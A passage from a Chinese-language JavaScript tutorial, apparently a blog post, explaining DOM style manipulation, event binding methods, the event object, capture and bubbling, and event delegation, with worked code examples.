img.loading = 'lazy';                 // 延遲載入
img.decoding = 'async';               // 非阻塞解碼
// 若需響應式來源：
img.setAttribute('srcset', '/img/hero-640.jpg 640w, /img/hero-1280.jpg 1280w');
img.setAttribute('sizes', '(max-width: 768px) 640px, 1280px');
```

{% note warning %}
**提醒：** 設定 `target="_blank"` 記得加上 `rel="noopener noreferrer"`；`tabindex` 請避免過度自訂正整數，優先使用自然 DOM 流或 `tabindex="-1"` 搭配程式聚焦。
{% endnote %}

### 樣式操作
DOM 提供了多種方式來設定元素的 CSS 樣式，每種方法都有其適用場景：

| 方法                     | 特色與優點                            | 適用情境          | 補充說明                                                          |
| ------------------------ | ------------------------------------- | ----------------- | ----------------------------------------------------------------- |
| `element.style.property` | 精確、直觀，僅影響單一 CSS 屬性       | 單一屬性修改      | 建議用於只需變更一個樣式屬性時，安全不影響其他樣式                |
| `element.style`          | 直接覆蓋所有 style，重設樣式          | 全部樣式重設      | 會移除原有所有樣式，適合完全重設或清空，需小心避免覆蓋重要樣式    |
| `Object.assign()`        | 批量設定多個 style 屬性，語法簡潔     | 多屬性批次修改    | 同時變更多個屬性且希望保留物件型態，適合動態樣式切換              |
| `style.cssText`          | 一次性設定全部樣式，效能佳            | 大量樣式設定      | 會覆蓋原有 style，適合一次性設定多個樣式但要注意樣式遺失          |
| `style.setProperty()`    | 支援 CSS 變數、`!important`、複雜屬性 | CSS 變數/特殊屬性 | 操作 CSS 原生變數、`!important` 或特殊屬性時最推薦，彈性最高      |
| `setAttribute()`         | 以 HTML 字串設定 style，靈活組合      | 動態組合/外部整合 | 適合根據條件組合 style 字串，或與外部樣式系統整合，易覆蓋全部樣式 |

以下是表格中提到的所有方法的完整範例：

```js
// demo > 完整樣式操作方法對照
// --------------------------------------------------
let element = document.getElementById("title");

// 1. element.style.* - 精確控制單一屬性
element.style.color = "red";
element.style.fontSize = "24px";
element.style.backgroundColor = "#f0f0f0";

console.log(element.style.color); // "red"

// 2. element.style - 直接設定 style 屬性（會覆蓋所有現有樣式）
element.style = "color: purple; background-color: #f0f0f0; font-size: 24px; padding: 10px;";

// 3. Object.assign() - 批量設定，程式碼簡潔
Object.assign(element.style, {
    color: "blue",
    backgroundColor: "#e8f4fd",
    fontSize: "28px",
    fontWeight: "bold",
    textAlign: "center",
    padding: "10px",
    border: "2px solid #007bff",
    borderRadius: "5px"
});

// 4. cssText - 使用 cssText 一次性設定，效能較好
element.style.cssText = `
    color: green;
    background-color: #f8f9fa;
    font-size: 32px;
    font-weight: bold;
    text-align: center;
    padding: 15px;
    border: 3px solid #28a745;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
`;

// 5. setProperty() - 支援 CSS 原生變數和複雜值
element.style.setProperty("margin", "1px 2px");
element.style.setProperty('color', 'red', 'important');
element.style.setProperty('--custom-color', '#ff6b6b');
element.style.setProperty('--custom-size', '20px');
element.style.setProperty('--custom-border', '2px solid #007bff');

// 6. setAttribute() - HTML 屬性控制方法，靈活性高
let theme = "dark";
let styles = theme === "dark" 
    ? "color: white; background-color: #333;" 
    : "color: black; background-color: #fff;";
element.setAttribute("style", styles);
```

{% note info %}
**setAttribute vs style 物件：**
- `setAttribute("style", "css 字串")` - 完全覆蓋所有樣式
- `element.style.property = value` - 精確控制單一屬性
- 選擇哪種方法取決於具體需求
{% endnote %}

{% note warning %}
**重要提醒：**
- 直接設定 `element.style = "css 字串"` 會覆蓋元素的所有現有樣式
- 如果需要保留某些樣式，建議使用 `cssText` 或 `Object.assign()`
- `setAttribute("style", "css 字串")` 也會完全覆蓋現有樣式
- 在複雜的樣式操作中，建議先備份原有樣式
{% endnote %}

## 事件處理
事件處理是 JavaScript 與用戶互動的核心機制。透過事件處理，我們可以響應用戶的各種操作，如點擊、滑鼠移動、鍵盤輸入等。JavaScript 可以監聽這些事件並執行相應的程式碼。

| 類別      | 事件名（常用）                                                                                                        | 描述                                       |
| --------- | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| 滑鼠      | click, dblclick, mousedown, mouseup, mouseenter, mouseleave, mouseover, mouseout, contextmenu                         | 點擊、按下/放開、移入/移出、右鍵選單       |
| 指標      | pointerdown, pointerup, pointermove, pointerenter, pointerleave, pointercancel, gotpointercapture, lostpointercapture | 統一滑鼠/觸控/手寫筆的事件介面             |
| 觸控      | touchstart, touchmove, touchend, touchcancel                                                                          | 行動裝置觸控事件                           |
| 鍵盤      | keydown, keyup                                                                                                        | 鍵盤按下/放開（`keypress` 已不推薦）       |
| 表單      | input, change, submit, reset                                                                                          | 輸入改變、提交、重設                       |
| 焦點      | focus, blur, focusin, focusout                                                                                        | 取得/失去焦點（`focusin/out` 會冒泡）      |
| 剪貼簿    | copy, cut, paste                                                                                                      | 複製、剪下、貼上                           |
| 拖放      | dragstart, drag, dragend, dragenter, dragleave, dragover, drop                                                        | HTML5 拖放事件                             |
| 滾動/視窗 | scroll, resize                                                                                                        | 捲動、視窗尺寸改變（請節流/防抖）          |
| 媒體      | play, pause, ended, timeupdate, volumechange, loadeddata                                                              | `<audio>`/`<video>` 媒體播放相關           |
| 網路/頁面 | load, DOMContentLoaded, beforeunload, unload, online, offline                                                         | 載入完成、DOM 就緒、離開頁面、網路連線變化 |
| DOM 改動  | mutation（透過 MutationObserver）                                                                                     | 監聽節點/屬性/文字改變                     |

{% note info %}
更完整清單可參考 MDN Events 目錄；本表列常用事件做快速索引。建議優先使用 Pointer Events 以統一滑鼠與觸控行為。
{% endnote %}

### 事件處理方法

JavaScript 提供了多種方式來綁定事件處理器，每種方法都有其優缺點。從簡單的 HTML 屬性到現代的 `addEventListener` 方法，我們需要根據具體需求選擇合適的方法。

#### HTML 屬性方法
```html
<button onclick="showMessage()">點擊我</button>
<input type="text" onchange="handleChange(this.value)">

<script>
function showMessage() {
    alert("按鈕被點擊了！");
}

function handleChange(value) {
    console.log("輸入值改變為：" + value);
}
</script>
```

{% note warning %}
**HTML 屬性方法的優缺點：**
**優點：**
- 簡單直接，容易理解
- 適合簡單的互動功能

**缺點：**
- HTML 和 JavaScript 混合，違反關注點分離原則
- 只能綁定一個事件處理器
- 難以維護和除錯
- 不支援事件委派
- 安全性較差（可能被 XSS 攻擊）
{% endnote %}

#### JavaScript 綁定方法
```html
<button id="myButton">點擊我</button>
<input type="text" id="myInput">

<script>
// 獲取元素
let btn = document.getElementById("myButton");
let input = document.getElementById("myInput");

// 綁定事件
btn.onclick = function() {
    alert("按鈕被點擊了！");
};

input.onchange = function() {
    console.log("輸入值改變為：" + this.value);
};
</script>
```

{% note warning %}
**JavaScript 綁定方法的優缺點：**
**優點：**
- 將 HTML 和 JavaScript 分離
- 比 HTML 屬性更安全
- 可以動態綁定和移除

**缺點：**
- 只能綁定一個事件處理器（後面的會覆蓋前面的）
- 無法綁定多個處理器
- 不支援事件委派
{% endnote %}

#### addEventListener 方法（推薦）
```html
<button id="myButton">點擊我</button>

<script>
let button = document.getElementById("myButton");

// 使用 addEventListener 綁定事件
button.addEventListener("click", function() {
    alert("按鈕被點擊了！");
});

// 可以綁定多個事件處理器
button.addEventListener("click", function() {
    console.log("第二個事件處理器");
});
</script>
```

{% note success %}
**addEventListener 方法的優缺點：**
**優點：**
- 可以綁定多個事件處理器
- 支援事件捕獲、選項（如 once、passive、signal）
- 更彈性，易維護且支援事件委派

**缺點：**
- 需要保留處理器參考，才能正確移除
{% endnote %}

### addEventListener 的解除事件綁定
當事件不再需要時，應適時解除以避免記憶體占用與重複觸發。

#### removeEventListener
當需要移除事件處理器時，必須使用 `removeEventListener` 方法

```html
<button id="myButton">點擊我</button>
<button id="removeBtn">移除事件</button>

<script>
let button = document.getElementById("myButton");
let removeBtn = document.getElementById("removeBtn");

// 定義事件處理器函式（必須是具名函式）
function handleClick() {
    alert("按鈕被點擊了！");
}

// 綁定事件
button.addEventListener("click", handleClick);

// 移除事件處理器
removeBtn.addEventListener("click", function() {
    button.removeEventListener("click", handleClick);
    console.log("事件處理器已移除");
});
</script>
```

{% note info %}
**removeEventListener 重要注意事項：**
- 只能移除具名函式的處理器，匿名函式無法移除
- 必須提供相同的函式參考和事件類型
- 常用於清理資源、防止記憶體洩漏
- 在元件卸載或頁面切換時特別重要
{% endnote %}

#### AbortController
使用 AbortController 控制多個監聽，一次中止

```html
<button id="btnAbort">點我，1 秒後自動解除監聽</button>

<script>
const btnAbort = document.getElementById('btnAbort');
const controller = new AbortController();
const { signal } = controller;

btnAbort.addEventListener('click', () => console.log('A'), { signal });
btnAbort.addEventListener('click', () => console.log('B'), { signal });

setTimeout(() => controller.abort(), 60000); // 60 秒後自動解除所有以該 signal 綁定的監聽
</script>
```

{% note info %}
**什麼是 AbortController / 為何抽取 signal？**
- AbortController 是瀏覽器提供的「取消控制器」，用來中止支援取消的操作（如 `addEventListener`、`fetch`）。
- `signal` 是「取消通知的載具」。把 `controller.signal` 傳給多個 API 後，呼叫 `controller.abort()` 便能一次性中止或自動解除所有綁定該 `signal` 的操作。
- 抽取 `signal`（`const { signal } = controller`）僅為語法便利，等同於多處使用 `controller.signal`；好處是「群組化管理生命週期」。
- 同一個 controller 只能 abort 一次；`signal.aborted` 會變為 `true` 並觸發 `abort` 事件；若需再次使用，請新建 controller。
- 常見用途在元件卸載、路由切換時，統一清理事件監聽或中止請求。
{% endnote %}

#### once time
使用 once：自動執行一次後解除 
```html
<button id="btnOnce">只觸發一次</button>

<script>
const btnOnce = document.getElementById('btnOnce');
btnOnce.addEventListener('click', () => {
  console.log('只會出現一次');
}, { once: true });
</script>
```

{% note info %}
**重點：**
- `removeEventListener` 必須傳入與 `addEventListener` 完全相同的參數（事件名、同一個回呼函式參考、相同的選項/捕獲旗標）
- 使用 `AbortController` 的 `signal` 可批次管理監聽生命週期
- 使用 `{ once: true }` 可在首次觸發後自動解除，無須手動移除
{% endnote %}

### event 物件
事件處理器會自動接收一個 event 物件，包含事件的詳細資訊。這個事件物件提供了豐富的屬性和方法，讓我們能夠深入了解事件的發生情況和相關資訊。

| 屬性/方法                 | 描述                              | 用途                   |
| ------------------------- | --------------------------------- | ---------------------- |
| `event.type`              | 事件類型（如 "click"、"keydown"） | 判斷事件類型           |
| `event.target`            | 觸發事件的元素                    | 獲取事件目標           |
| `event.currentTarget`     | 當前處理事件的元素                | 事件委派時區分目標     |
| `event.clientX/clientY`   | 滑鼠在視窗中的座標                | 滑鼠位置追蹤           |
| `event.pageX/pageY`       | 滑鼠在頁面中的座標                | 頁面座標計算           |
| `event.screenX/screenY`   | 滑鼠在螢幕中的座標                | 螢幕座標計算           |
| `event.key`               | 按下的按鍵                        | 鍵盤事件處理           |
| `event.keyCode`           | 按鍵的鍵碼                        | 鍵盤事件處理           |
| `event.ctrlKey`           | Ctrl 鍵是否按下                   | 組合鍵檢測             |
| `event.shiftKey`          | Shift 鍵是否按下                  | 組合鍵檢測             |
| `event.altKey`            | Alt 鍵是否按下                    | 組合鍵檢測             |
| `event.timeStamp`         | 事件觸發的時間戳（毫秒）          | 記錄事件發生時間       |
| `event.preventDefault()`  | 阻止預設行為                      | 表單提交、連結跳轉控制 |
| `event.stopPropagation()` | 阻止事件冒泡                      | 事件傳播控制           |

#### 事件綁定方式的 event 物件獲取

前面我們學習了三種事件綁定方式，現在讓我們看看每種方式如何獲取和使用事件物件：

##### HTML 屬性方法

```html
<button onclick="handleClick(event)">點擊我</button>
<input type="text" onchange="handleChange(event)">
<input type="text" onkeydown="handleKeyDown(event)">
<a href="https://example.com" onclick="handleLink(event)">前往外部連結（阻止跳轉）</a>
<script>
// HTML 屬性方式需要手動傳遞 event 參數
function handleClick(event) {
    console.log("事件類型：" + event.type);
    console.log("目標元素：" + event.target.tagName);
    console.log("滑鼠位置：" + event.clientX + ", " + event.clientY);
    console.log("是否按下 Ctrl：" + event.ctrlKey);
}

function handleChange(event) {
    console.log("輸入值：" + event.target.value);
    console.log("事件類型：" + event.type);
}

function handleKeyDown(event) {
    console.log("按下的鍵：" + event.key);
    console.log("鍵碼：" + event.keyCode);
    
    // 阻止 Enter 鍵的預設行為（例如避免表單提交）
    if (event.key === 'Tab') {
        event.preventDefault();
        console.log("已阻止 Tab 鍵的預設行為（離開此框）");
    }
}

function handleLink(event) {
  event.preventDefault();
  console.log("已阻止連結跳轉，改為執行自訂邏輯（例如開啟 modal）");
}
</script>
```
{% note info %}
**HTML 屬性方式特點：**
- 必須手動傳遞 `event` 參數
- 語法：`onclick="handleClick(event)"`
- 事件物件會自動傳入，但需要在函式參數中接收
{% endnote %}

##### JavaScript 綁定方法

```html
<button id="myButton">點擊我</button>
<input type="text" id="myInput">
    
    <script>
let button = document.getElementById("myButton");
let input = document.getElementById("myInput");

// JavaScript 綁定方式，事件物件自動傳入
button.onclick = function(event) {
    console.log("事件類型：" + event.type);
    console.log("目標元素：" + event.target.tagName);
    console.log("滑鼠位置：" + event.clientX + ", " + event.clientY);
    console.log("是否按下 Ctrl：" + event.ctrlKey);
};

input.onchange = function(event) {
    console.log("輸入值：" + event.target.value);
    console.log("事件類型：" + event.type);
};

input.onkeydown = function(event) {
    console.log("按下的鍵：" + event.key);
    console.log("鍵碼：" + event.keyCode);
    
    // 阻止 Tab 鍵的預設行為
    if (event.key === 'Tab') {
        event.preventDefault();
        console.log("已阻止 Tab 鍵的預設行為");
    }
};
    </script>
```

{% note info %}
**JavaScript 綁定方式特點：**
- 事件物件自動傳入函式參數
- 語法：`element.onclick = function(event) { ... }`
- 不需要手動傳遞 event 參數
{% endnote %}

##### addEventListener 方法

```html
<button id="myButton">點擊我</button>
<input type="text" id="myInput">

<script>
let button = document.getElementById("myButton");
let input = document.getElementById("myInput");

// addEventListener 方式，事件物件自動傳入
button.addEventListener("click", function(event) {
    console.log("事件類型：" + event.type);
    console.log("目標元素：" + event.target.tagName);
    console.log("當前目標：" + event.currentTarget.tagName);
    console.log("滑鼠位置：" + event.clientX + ", " + event.clientY);
    console.log("是否按下 Ctrl：" + event.ctrlKey);
});

input.addEventListener("change", function(event) {
    console.log("輸入值：" + event.target.value);
    console.log("事件類型：" + event.type);
});

input.addEventListener("keydown", function(event) {
    console.log("按下的鍵：" + event.key);
    console.log("鍵碼：" + event.keyCode);
    
    // 阻止 Tab 鍵的預設行為
    if (event.key === 'Tab') {
        event.preventDefault();
        console.log("已阻止 Tab 鍵的預設行為");
    }
});

// 可以綁定多個事件處理器
button.addEventListener("click", function(event) {
    console.log("第二個點擊事件處理器");
    console.log("事件時間戳：" + event.timeStamp);
});
</script>
```

{% note success %}
**addEventListener 方式特點：**
- 事件物件自動傳入函式參數
- 語法：`element.addEventListener("event", function(event) { ... })`
- 可以綁定多個事件處理器
- 支援事件委派
- 提供 `currentTarget` 屬性區分事件委派
{% endnote %}

#### 實際應用範例
以下將透過幾個常見的實務範例，展示如何運用事件處理來提升網頁互動性與用戶體驗。這些範例涵蓋滑鼠、鍵盤、表單等不同場景，幫助你靈活掌握事件的應用。

##### 禁用右鍵選單與選取文字
```js
document.addEventListener('contextmenu', function(event) {
  event.preventDefault();
  alert('右鍵已被禁用');
  return false;
});

document.addEventListener('selectstart', function(event) {
  event.preventDefault();
  alert('禁用選取文字');
  return false;
});
```

##### 鍵盤快捷鍵
```js
document.addEventListener('keydown', function (event) {
  // Ctrl + S 儲存
  if (event.ctrlKey && event.key === 's') {
    event.preventDefault();
    console.log('執行儲存操作');
  }

  // Ctrl + Z 復原
  if (event.ctrlKey && event.key === 'z') {
    event.preventDefault();
    console.log('執行復原操作');
  }

  // ESC 鍵關閉
  if (event.key === 'Escape') {
    console.log('關閉當前視窗或對話框');
  }
});
```

##### 滑鼠拖拽功能
```html
    <style>
  #draggable {
    position: absolute;
    left: 100px;
    top: 100px;
    width: 100px;
    height: 100px;
    background-color: red;
  }
</style>

<div id="draggable">Drag me</div>

<script>
  createDraggableElement(document.getElementById('draggable'));

  function createDraggableElement(element) {
    let isDragging = false;
    let initMouseX, initMouseY, initElementX, initElementY;

    element.addEventListener('mousedown', function (event) {
      isDragging = true;
      initMouseX = event.clientX;
      initMouseY = event.clientY;
      initElementX = element.offsetLeft;
      initElementY = element.offsetTop;

      // 阻止文字選取
      event.preventDefault();
    });

    document.addEventListener('mousemove', function (event) {
      if (!isDragging) return;

      const mouseMoveX = event.clientX - initMouseX;
      const mouseMoveY = event.clientY - initMouseY;

      element.style.left = (initElementX + mouseMoveX) + 'px';
      element.style.top = (initElementY + mouseMoveY) + 'px';
    });

    document.addEventListener('mouseup', function (event) {
      isDragging = false;
    });
  }
</script>
```

##### 表單驗證與提交控制
```html
<style>
  #myForm {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 80vh;
  }

  fieldset {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
  }

  .form-group {
    display: flex;
    flex-direction: column;
    align-items: center;
        }

  #error-message {
    color: red;
    font-size: 14px;
    margin-top: 5px;
    display: none;
  }
</style>
    <form id="myForm">
  <fieldset>
    <legend>Enter your email</legend>
        <div class="form-group">
      <input type="email" id="email" placeholder="Enter your email">
      <div id="error-message"></div>
        </div>
    <button type="submit">Submit</button>
  </fieldset>
</form>
<script>
  const emailInput = document.getElementById('email');
  const errorMessage = document.getElementById('error-message');
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // 當輸入框失去焦點時立即驗證
  emailInput.addEventListener('blur', function () {
    const email = this.value.trim();

    if (email === '') {
      // 如果為空，隱藏錯誤訊息
      errorMessage.style.display = 'none';
      errorMessage.textContent = '';
      return;
    }

    const isValid = emailRegex.test(email);
    errorMessage.textContent = isValid ? '' : '請輸入有效的電子郵件地址';
    errorMessage.style.display = isValid ? 'none' : 'block';
  });

  // 表單提交時的驗證
  document.getElementById('myForm').addEventListener('submit', function (event) {
    const email = emailInput.value.trim();  // trim 可以去除字串兩端的空白字元

    if (!email) {  // 如果 email 為空，阻止表單提交，並顯示錯誤訊息
      event.preventDefault();
        errorMessage.textContent = '請輸入電子郵件地址';
      errorMessage.style.display = 'block';
      return false;
      }

    if (!emailRegex.test(email)) {  // 如果 email 不符合正規表示式，阻止表單提交，並顯示錯誤訊息
      event.preventDefault();
      errorMessage.textContent = '請輸入有效的電子郵件地址';
      errorMessage.style.display = 'block';
      return false;
    }

    errorMessage.textContent = '';  // 清空錯誤訊息
    errorMessage.style.display = 'none';  // 隱藏錯誤訊息
    console.log('表單驗證通過，準備提交');
  });
    </script>
```

{% note info %}
**事件物件的重要概念：**
- `event.target`：實際觸發事件的元素
- `event.currentTarget`：當前處理事件的元素（在事件委派中很有用）
- `event.preventDefault()`：阻止元素的預設行為
- `event.stopPropagation()`：阻止事件繼續冒泡
- 事件物件在事件處理函式中自動傳入，無需手動傳遞
{% endnote %}

{% note warning %}
**注意事項：**
- HTML 屬性方式需要手動傳遞 `event` 參數
- JavaScript 方式的事件物件會自動傳入
- 某些事件（如 `keydown`）需要元素獲得焦點才能觸發
- 使用 `preventDefault()` 時要謹慎，確保不會影響用戶體驗
{% endnote %}

### 事件傳播機制：捕獲與冒泡

JavaScript 的事件傳播分為三個階段：**捕獲階段**、**目標階段**、**冒泡階段**。當使用者點擊一個元素時，事件會經歷完整的傳播過程：

1. **捕獲階段（Capturing Phase）**：事件從 `document` 開始，**向下傳播**到目標元素
2. **目標階段（Target Phase）**：事件在目標元素上觸發
3. **冒泡階段（Bubbling Phase）**：事件從目標元素開始，**向上傳播**回到 `document`

{% mermaid graph TD %}
  Start["使用者點擊 inner 元素"] 
  D["document<br/>（最外層）"]
  C["container"]
  I["inner<br/>（目標元素）<br/>🟣 目標階段<br/>事件在此觸發"]
  End["事件傳播完成"]

  Start --> D
  D -->|"🔵 捕獲階段<br/>⬇️ 向下傳播"| C
  C -->|"🔵 捕獲階段<br/>⬇️ 向下傳播"| I
  I -->|"🟢 冒泡階段<br/>⬆️ 向上傳播"| C
  C -->|"🟢 冒泡階段<br/>⬆️ 向上傳播"| D
  D --> End
  
  style Start fill:#fff3e0,stroke:#f57c00,stroke-width:2px
  style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px
  style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px
  style I fill:#f3e5f5,stroke:#7b1fa2,stroke-width:3px
  style End fill:#fff3e0,stroke:#f57c00,stroke-width:2px
{% endmermaid %}

#### 事件捕獲（Event Capturing）

**事件捕獲**是指事件從最外層的 `document` 開始，**向下傳播**到目標元素的過程。在這個階段：
- 事件會**先觸發最外層的元素**（document），然後逐層向下
- 傳播順序：`document` → `container` → `inner`（目標元素）
- 就像「從外層向內層捕捉事件」一樣，因此稱為「捕獲」

{% note info %}
**補充說明：**
當你在上層元素（像是 `document`、`container`）也用「捕獲模式」設定同一種事件（例如 `click`）時，事件在傳遞過程中，這些上層元素也算在事件的經過範圍內，所以會按照由外到內的順序一個一個執行。簡單來說，捕獲階段就是外層到內層，所有設定為捕獲的監聽器都會被觸發。
{% endnote %}


**使用場景：**
- 當需要在事件到達目標元素之前就攔截處理時
- 例如：在表單提交前進行全域驗證

#### 事件冒泡（Event Bubbling）

**事件冒泡**是指事件從目標元素開始，**向上傳播**回到 `document` 的過程。在這個階段：
- 事件會**先觸發目標元素**，然後逐層向上
- 傳播順序：`inner`（目標元素）→ `container` → `document`
- 就像「氣泡從水底向上浮起」一樣，因此稱為「冒泡」

{% note warning %}
**重要觀念**：
在冒泡過程中，如果上層元素（如 `container`、`document`）也有綁定**同一種事件**的事件監聽器（例如 `click`），預設情況下這些監聽器都會依序被觸發。這與前面捕獲階段類似，只是事件是從目標元素往外一層一層「氣泡式」傳遞到外層。這種設計讓我們能在不同層級，一起攔截與處理相同類型的事件。
{% endnote %}


**實際範例：**
```javascript
// 如果 container 和 document 都有綁定 click 事件
container.addEventListener('click', () => console.log('container 被觸發'));
document.addEventListener('click', () => console.log('document 被觸發'));

// 當點擊 inner 元素時，輸出順序為：
// 1. inner 的事件處理（目標階段）
// 2. container 的事件處理（冒泡階段）
// 3. document 的事件處理（冒泡階段）
```

**使用場景：**
- **事件委派（Event Delegation）**：在父元素上監聽事件，處理多個子元素的事件
- 例如：在 `ul` 上監聽 `click` 事件，處理所有 `li` 的點擊

#### 觀察事件傳播（捕獲與冒泡）

讓我們透過一個實際的範例來觀察完整的事件傳播過程，包括捕獲階段和冒泡階段：

{% note info %}
**addEventListener 的第三個參數：**
- `addEventListener(event, handler, false)` 或省略：在冒泡階段觸發（預設）
- `addEventListener(event, handler, true)`：在捕獲階段觸發
- 這個參數控制事件監聽器在哪個階段執行
{% endnote %}

```html
<style>
  .container {
    border: 2px solid #007bff;
    background-color: #e3f2fd;
  }

  .outer {
    border: 2px solid #28a745;
    background-color: #d4edda;
  }

  .inner {
    border: 2px solid #dc3545;
    background-color: #f8d7da;
  }
</style>

<h1>事件傳播觀察（捕獲與冒泡）</h1>
<p>點擊最內層的紅色區域，在瀏覽器控制台觀察完整的事件傳播過程</p>
<div class="container" id="container">
  <h3>Container （最外層）</h3>
  <div class="outer" id="outer">
    <h3>Outer （中間層）</h3>
    <div class="inner" id="inner">
      <h3>Inner （最內層）</h3>
      <p>點擊這裡觀察事件冒泡</p>
    </div>
  </div>
</div>
<hr>
<button id="clearConsole">清除 Console</button>

<script>
  // 為每個層級綁定點擊事件（冒泡階段）
  document.getElementById('container').addEventListener('click', function (event) {
    console.log('🟦 Container 接收到點擊事件（冒泡階段）');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('   事件階段：', event.eventPhase === 3 ? '冒泡' : '其他');
    console.log('---');
  });

  document.getElementById('outer').addEventListener('click', function (event) {
    console.log('🟩 Outer 接收到點擊事件（冒泡階段）');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('   事件階段：', event.eventPhase === 3 ? '冒泡' : '其他');
    console.log('---');
  });

  document.getElementById('inner').addEventListener('click', function (event) {
    console.log('🟥 Inner 接收到點擊事件（目標階段）');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('   事件階段：', event.eventPhase === 2 ? '目標' : '其他');
    console.log('---');
  });

  // ※ 第三個參數 true 表示在捕獲階段觸發
  // ---------------------------------------------------------------------

  // 為每個層級綁定點擊事件（捕獲階段）
  document.getElementById('container').addEventListener('click', function (event) {
    console.log('🔵 Container 接收到點擊事件（捕獲階段）');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('   事件階段：', event.eventPhase === 1 ? '捕獲' : '其他');
    console.log('---');
  }, true); // 第三個參數 true 表示在捕獲階段觸發

  document.getElementById('outer').addEventListener('click', function (event) {
    console.log('🟢 Outer 接收到點擊事件（捕獲階段）');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('   事件階段：', event.eventPhase === 1 ? '捕獲' : '其他');
    console.log('---');
  }, true); // 第三個參數 true 表示在捕獲階段觸發

  document.getElementById('inner').addEventListener('click', function (event) {
    console.log('🔴 Inner 接收到點擊事件（捕獲階段）');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('   事件階段：', event.eventPhase === 1 ? '捕獲' : '其他');
    console.log('---');
  }, true); // 第三個參數 true 表示在捕獲階段觸發

  // 清除 Console 按鈕
  document.getElementById('clearConsole').addEventListener('click', function () {
    console.clear();
  });
</script>
```

從上述程式碼的執行結果，我們可以歸納出完整的事件傳播機制：

#### 事件傳播的關鍵觀察點：

1. **完整的事件傳播順序**：
   - **捕獲階段**：Container → Outer → Inner（從外到內）
   - **目標階段**：Inner（目標元素）
   - **冒泡階段**：Inner → Outer → Container（從內到外）

2. **event.target**：始終指向實際被點擊的元素（Inner）
3. **event.currentTarget**：指向當前處理事件的元素（各層級）
4. **event.eventPhase**：表示事件階段（1=捕獲，2=目標，3=冒泡）
5. **addEventListener 的第三個參數**：true 表示捕獲階段，false 表示冒泡階段

{% note info %}
**觀察重點：**
- 當點擊 Inner 時，完整的事件傳播順序是：
  - 🔵 Container（捕獲）→ 🟢 Outer（捕獲）→ 🔴 Inner（捕獲）
  - 🟥 Inner（目標）
  - 🟩 Outer（冒泡）→ 🟦 Container（冒泡）
- `event.target` 在所有階段都是 "inner"
- `event.currentTarget` 會分別是各層級的元素
- 捕獲階段先於冒泡階段執行
- 這正是事件委派能夠工作的原理
{% endnote %}

#### 阻止事件冒泡
現在讓我們觀察如何阻止事件冒泡。在 outer 的點擊事件中添加 `event.stopPropagation()`：

```html
<style>
  .container {
    border: 2px solid #007bff;
    background-color: #e3f2fd;
  }

  .outer {
    border: 2px solid #28a745;
    background-color: #d4edda;
  }

  .inner {
    border: 2px solid #dc3545;
    background-color: #f8d7da;
  }
</style>

<h1>阻止事件冒泡觀察</h1>
<p>點擊紅色區域，觀察 Outer 阻止冒泡後的效果</p>

<div class="container" id="container">
  <h3>Container （最外層）</h3>
  <div class="outer" id="outer">
    <h3>Outer （中間層）</h3>
    <div class="inner" id="inner">
      <h3>Inner （最內層）</h3>
      <p>點擊這裡觀察事件冒泡被阻止</p>
    </div>
  </div>
</div>
<hr>
<button id="clearConsole">清除 Console</button>

<script>
  // 為每個層級綁定點擊事件
  document.getElementById('container').addEventListener('click', function (event) {
    console.log('🟦 Container 接收到點擊事件');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('---');
  });

  document.getElementById('outer').addEventListener('click', function (event) {
    console.log('🟩 Outer 接收到點擊事件');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('🚫 阻止事件冒泡');
    event.stopPropagation(); // 阻止事件繼續向上冒泡
    console.log('---');
  });

  document.getElementById('inner').addEventListener('click', function (event) {
    console.log('🟥 Inner 接收到點擊事件');
    console.log('   目標元素：', event.target.id);
    console.log('   當前元素：', event.currentTarget.id);
    console.log('---');
  });

  // 清除 Console 按鈕
  document.getElementById('clearConsole').addEventListener('click', function () {
    console.clear();
  });
</script>
```

阻止冒泡的觀察重點：

- **事件傳播順序**：Inner → Outer（在 Outer 被阻止）
- **Container 不會接收到事件**：因為 Outer 阻止了冒泡
- **event.stopPropagation() 的作用**：阻止事件繼續向上傳播
- **實際應用場景**：防止事件影響到父元素或其他層級

{% note warning %}
**重要提醒：**
- `event.stopPropagation()` 會阻止事件繼續冒泡
- 使用時要謹慎，確保不會影響其他功能
- 在事件委派中要特別注意，可能影響父元素的事件處理
{% endnote %}

### 事件委派
事件委派是基於事件冒泡機制的一種優雅解決方案。利用事件冒泡機制，將事件監聽器綁定在父元素上，而不是每個子元素上。當子元素的事件發生時，事件會冒泡到父元素，父元素的事件處理器就能捕獲到這個事件。



{% note info %}
**為什麼需要事件傳播機制？**
- **事件委派**：可以在父元素上統一處理多個子元素的事件，減少事件監聽器的數量
- **靈活控制**：可以選擇在捕獲階段或冒泡階段處理事件，滿足不同的需求
- **統一處理**：可以在任何層級攔截和處理事件，不需要在每個元素上都綁定事件
{% endnote %}

{% mermaid graph TD %}
    %% DOM 結構
    Ul["ul#todoList<br/>（綁定事件監聽器）"]
    Ul --> Li1["li 項目 1"]
    Ul --> Li2["li 項目 2"]
    Ul --> Li3["li 項目 3"]

    %% 事件流程
    Click["使用者點擊<br/>li 項目 2"]
    Click --> Li2
    Li1 -->|"事件冒泡"| UlHandler
    Li2 -->|"事件冒泡"| UlHandler
    Li3 -->|"事件冒泡"| UlHandler
    UlHandler["ul#todoList 的事件處理函式<br/>被觸發"] -->|"使用 event.target"| FindTarget["找到目標元素<br/>event.target = li 項目 2"]
    FindTarget -->|"執行動作"| Action["對 li 項目 2<br/>執行動作<br/>（例如：刪除、修改樣式）"]

    %% 樣式強調
    style Click fill:#ff6b6b,stroke:#d63031,stroke-width:2px
